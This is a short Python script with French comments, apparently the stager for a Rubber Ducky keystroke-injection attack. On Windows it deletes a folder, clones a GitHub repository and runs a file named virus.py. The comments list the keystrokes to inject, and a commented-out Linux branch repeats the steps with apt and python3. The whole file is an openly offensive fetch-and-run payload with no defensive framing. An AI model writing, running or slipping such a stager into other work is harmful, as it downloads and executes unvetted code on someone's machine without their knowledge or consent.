import os #touches : windows + c + m + d + Enter
if os.name == "nt":
    #Git doit etre installé
    os.system("rmdir script2 /s /q")
    os.system("echo ETAPE 1 FIN") 
    os.system("git clone https://github.com/LiamCrsd/RubberDucky") #touches : g + ... + 2 + Enter
    os.system("git checkout github")
    os.system("echo ETAPE 2 FIN") 
    os.system("python RubberDucky/script2/virus.py")
    os.system("echo ETAPE 3 FIN") 
else :
    """
    os.system("apt install git-all")
    os.system("echo ETAPE 0 FIN") 
    os.system("rm -r script2")
    os.system("echo ETAPE 1 FIN") 
    os.system("git clone https://github.com/LiamCrsd/script2") #touches : g + ... + 2 + Enter
    os.system("git checkout github")
    os.system("echo ETAPE 2 FIN") 
    os.system("python3 RubberDucky/script2/virus.py")
    os.system("echo ETAPE 3 FIN")    
    """ 